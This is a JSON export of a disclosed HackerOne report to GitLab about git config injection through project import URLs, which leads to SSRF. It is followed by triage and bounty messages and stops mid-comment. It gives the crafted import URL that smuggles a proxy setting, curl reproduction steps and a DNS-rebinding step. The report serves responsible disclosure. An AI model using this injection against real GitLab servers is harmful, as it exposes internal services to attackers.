{"id":855276,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTUyNzY=","url":"https://hackerone.com/reports/855276","title":"Injection of `http.\u003curl\u003e.*` git config settings leading to SSRF","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-04-21T14:56:04.931Z","submitted_at":"2020-04-21T14:56:04.931Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vakzz","url":"/vakzz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-08T13:46:02.172Z","bug_reporter_agreed_on_going_public_at":"2020-09-08T13:46:02.134Z","team_member_agreed_on_going_public_at":"2020-09-08T13:30:35.102Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\n\nWhen import a repo with credentials via a URL, gitaly generates the git clone command with a `-c` flag to add the Authorization header:\n\nhttps://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37\n```go\nflags = append(flags, git.ValueFlag{Name: \"-c\", Value: fmt.Sprintf(\"http.%s.extraHeader=%s\", u.String(), authHeader)})\n```\n\nWhich will create a command such as:\n```bash\ngit clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path\n```\n\nThe issue is that the url can contain one of the http config values from https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt, which will result the user supplied config being set instead of `extraHeader` (with the `.extraHeader..` being appended to the value).\n\nThis allows an attacker to set things like `http.proxy` which can result in a SSRF if they use an import url such as `http://user@google.com/.proxy=http://proxy.aw.rs:8500`\n\n\n### Steps to reproduce\n1. Create a dns entry with a short TTL\n1. Start a server listening on the port that you want to hit with the SSRF that always returns `200 OK`, something like {F797777}\n1. Create a project with the specially crafted import url: `curl -H \"Authorization: Bearer $TOKEN\" -v -XPOST 'http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500\u0026name=proxy4'`. This results in the following `.git/config` for the repo:\n\n    ```bash\n    sudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config\n    [core]\n        repositoryformatversion = 0\n        filemode = true\n        bare = true\n    [http]\n        followredirects = false\n    [http \"http://google.com/\"]\n        proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==\n    ```\n1. Update the dns entry to point to `127.0.0.1` and wait for it to propergate\n1. Add a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a `?` to make sure the appended paths are removed: `curl -H \"Authorization: Bearer $TOKEN\" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true\u0026import_url=http://google.com/v1/config?'`\n1. Check the status of the import to see the result of the SSRF (in this case hitting consul on port 8500)\n    ```bash\ncurl -H \"Authorization: Bearer $TOKEN\" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error`\n\"2:Fetching remote upstream failed: remote: method GET not allowed\\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\\n\"\n    ```\n\nGit (via curl) allows for `socks4` and `socks5` proxies as well which could potentially be used to generated other SSRF payloads for things like redis or for leaking internal dns resolutions. There maybe other `http.*` configs that could be exploited, an interesting one is `http.cookieFile` but due to the appended `.extraHeader=` the path is not really controllable from my initial testing.\n\n### Impact\n* An attacker can set the `http.\u003curl\u003e.proxy` git config resulting in SSRF\n\n### What is the current *bug* behavior?\nThe git http config propertied can be influenced by the import url\n\n### What is the expected *correct* behavior?\nOnly the `extraHeader` config should be set via the git clone.\n\n### Output of checks\n#### Results of GitLab environment info\n```\nSystem information\nSystem:\t\tUbuntu 18.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.5p114\nGem Version:\t2.7.10\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t5.0.7\nGit Version:\t2.24.2\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.9.4-ee\nRevision:\t6a1a8e88568\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.12\nURL:\t\thttp://gitlab-vm.local\nHTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t12.0.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\n* An attacker can set the `http.\u003curl\u003e.proxy` git config resulting in SSRF","vulnerability_information_html":"\u003ch3 id=\"summary\"\u003eSummary\u003c/h3\u003e\n\n\u003cp\u003eWhen import a repo with credentials via a URL, gitaly generates the git clone command with a \u003ccode\u003e-c\u003c/code\u003e flag to add the Authorization header:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitaly%2F-%2Fblob%2Fmaster%2Finternal%2Fservice%2Frepository%2Fcreate_from_url.go%23L37\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight go\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003egit\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eValueFlag\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;-c\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eValue\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003efmt\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http.%s.extraHeader=%s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eu\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"n\"\u003eauthHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e)})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich will create a command such as:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003egit clone \u003cspan class=\"nt\"\u003e--bare\u003c/span\u003e \u003cspan class=\"nt\"\u003e-c\u003c/span\u003e http.followRedirects\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003efalse\u003c/span\u003e \u003cspan class=\"nt\"\u003e-c\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--\u003c/span\u003e http://example.com/repo.git /repo/path\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe issue is that the url can contain one of the http config values from \u003ca title=\"https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt\" href=\"/redirect?url=https%3A%2F%2Fgit-scm.com%2Fdocs%2Fgit-config%23Documentation%2Fgit-config.txt-httplturlgt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which will result the user supplied config being set instead of \u003ccode\u003eextraHeader\u003c/code\u003e (with the \u003ccode\u003e.extraHeader..\u003c/code\u003e being appended to the value).\u003c/p\u003e\n\n\u003cp\u003eThis allows an attacker to set things like \u003ccode\u003ehttp.proxy\u003c/code\u003e which can result in a SSRF if they use an import url such as \u003ccode\u003ehttp://user@google.com/.proxy=http://proxy.aw.rs:8500\u003c/code\u003e\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eCreate a dns entry with a short TTL\u003c/li\u003e\n\u003cli\u003eStart a server listening on the port that you want to hit with the SSRF that always returns \u003ccode\u003e200 OK\u003c/code\u003e, something like \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"proxy.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bCVjsoFjdcjTMVBs7ktcT63c?response-content-disposition=attachment%3B%20filename%3D%22proxy.py%22%3B%20filename%2A%3DUTF-8%27%27proxy.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026amp;X-Amz-Signature=432f81d66d2db4f62a6d1a6219378b567d10cbd1a57895f43d8b2132533a23db\" data-attachment-type=\"text/x-python\"\u003eproxy.py (F797777)\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreate a project with the specially crafted import url: \u003ccode\u003ecurl -H \u0026quot;Authorization: Bearer $TOKEN\u0026quot; -v -XPOST \u0026#39;http://gitlab-vm.local/api/v4/projects?import_url=http://user@google.com/.proxy=http://proxy.aw.rs:8500\u0026amp;name=proxy4\u0026#39;\u003c/code\u003e. This results in the following \u003ccode\u003e.git/config\u003c/code\u003e for the repo:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003esudo cat\u003c/span\u003e /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config\n\u003cspan class=\"o\"\u003e[\u003c/span\u003ecore]\n    repositoryformatversion \u003cspan class=\"o\"\u003e=\u003c/span\u003e 0\n    filemode \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\n    \u003c/span\u003ebare \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"o\"\u003e[\u003c/span\u003ehttp]\n    followredirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003cspan class=\"o\"\u003e[\u003c/span\u003ehttp \u003cspan class=\"s2\"\u003e\u0026quot;http://google.com/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n    proxy \u003cspan class=\"o\"\u003e=\u003c/span\u003e http://proxy.aw.rs:8500.extraHeader\u003cspan class=\"o\"\u003e=\u003c/span\u003eAuthorization: Basic \u003cspan class=\"nv\"\u003edXNlcg\u003c/span\u003e\u003cspan class=\"o\"\u003e==\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUpdate the dns entry to point to \u003ccode\u003e127.0.0.1\u003c/code\u003e and wait for it to propergate\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAdd a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a \u003ccode\u003e?\u003c/code\u003e to make sure the appended paths are removed: \u003ccode\u003ecurl -H \u0026quot;Authorization: Bearer $TOKEN\u0026quot; -v -XPUT \u0026#39;http://gitlab-vm.local/api/v4/projects/204?mirror=true\u0026amp;import_url=http://google.com/v1/config?\u0026#39;\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCheck the status of the import to see the result of the SSRF (in this case hitting consul on port 8500)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ecurl \u003cspan class=\"nt\"\u003e-H\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;Authorization: Bearer \u003c/span\u003e\u003cspan class=\"nv\"\u003e$TOKEN\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-v\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;http://gitlab-vm.local/api/v4/projects/204\u0026#39;\u003c/span\u003e | jq .import_error\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;2:Fetching remote upstream failed: remote: method GET not allowed\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003efatal: unable to access \u0026#39;http://google.com/v1/config?/\u0026#39;: The requested URL returned error: 405\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eGit (via curl) allows for \u003ccode\u003esocks4\u003c/code\u003e and \u003ccode\u003esocks5\u003c/code\u003e proxies as well which could potentially be used to generated other SSRF payloads for things like redis or for leaking internal dns resolutions. There maybe other \u003ccode\u003ehttp.*\u003c/code\u003e configs that could be exploited, an interesting one is \u003ccode\u003ehttp.cookieFile\u003c/code\u003e but due to the appended \u003ccode\u003e.extraHeader=\u003c/code\u003e the path is not really controllable from my initial testing.\u003c/p\u003e\n\n\u003ch3 id=\"impact\"\u003eImpact\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eAn attacker can set the \u003ccode\u003ehttp.\u0026lt;url\u0026gt;.proxy\u003c/code\u003e git config resulting in SSRF\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"what-is-the-current-bug-behavior\"\u003eWhat is the current \u003cem\u003ebug\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eThe git http config propertied can be influenced by the import url\u003c/p\u003e\n\n\u003ch3 id=\"what-is-the-expected-correct-behavior\"\u003eWhat is the expected \u003cem\u003ecorrect\u003c/em\u003e behavior?\u003c/h3\u003e\n\n\u003cp\u003eOnly the \u003ccode\u003eextraHeader\u003c/code\u003e config should be set via the git clone.\u003c/p\u003e\n\n\u003ch3 id=\"output-of-checks\"\u003eOutput of checks\u003c/h3\u003e\n\n\u003ch4 id=\"results-of-gitlab-environment-info\"\u003eResults of GitLab environment info\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSystem information\nSystem:     Ubuntu 18.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.5p114\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.7\nGit Version:    2.24.2\nSidekiq Version:5.2.7\nGo Version: unknown\n\nGitLab information\nVersion:    12.9.4-ee\nRevision:   6a1a8e88568\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 10.12\nURL:        http://gitlab-vm.local\nHTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    12.0.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAn attacker can set the \u003ccode\u003ehttp.\u0026lt;url\u0026gt;.proxy\u003c/code\u003e git config resulting in SSRF\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":797777,"file_name":"proxy.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bCVjsoFjdcjTMVBs7ktcT63c?response-content-disposition=attachment%3B%20filename%3D%22proxy.py%22%3B%20filename%2A%3DUTF-8%27%27proxy.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=432f81d66d2db4f62a6d1a6219378b567d10cbd1a57895f43d8b2132533a23db","file_size":343,"type":"text/x-python"}],"allow_singular_disclosure_at":null,"vote_count":29,"voters":["overjt","sultancad","bl4de","pirateducky","youngsheldon","mygf","leonishan","naategh","zimmer75","h1-qualys-scan","and 19 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":39022,"asset_type":"OTHER","asset_identifier":"Your Own GitLab Instance","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7741720,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vakzz,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 20 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-04-21T15:05:50.104Z","updated_at":"2020-04-21T15:05:50.104Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7744966,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @vakzz ,\n\nThank you once again for the great report quality.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/215212.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nGitLab Security Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you once again for the great report quality.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab/-/issues/215212\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2F-%2Fissues%2F215212\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab/-/issues/215212\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.  This issue will be made public 30 days following the release of a patch.\u003c/p\u003e\n\n\u003cp\u003eGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\u003c/p\u003e\n\n\u003cp\u003eWe will continue to update you via HackerOne as a patch is scheduled for release.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nDominic\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-21T20:42:06.382Z","updated_at":"2020-04-21T20:42:06.382Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7744971,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Initial $1000 on triage","markdown_message":"\u003cp\u003eInitial $1000 on triage\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-21T20:42:33.240Z","updated_at":"2020-04-21T20:42:33.240Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"vakzz","url":"/vakzz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7747388,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @vakzz,\n\nThe issue you reported is currently scheduled to be fixed by 2020-06-30.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eETA for fix:\u003c/p\u003e\n\n\u003cp\u003eHi \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe issue you reported is currently scheduled to be fixed by 2020-06-30.\u003c/p\u003e\n\n\u003cp\u003eThank you again for contacting us!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security 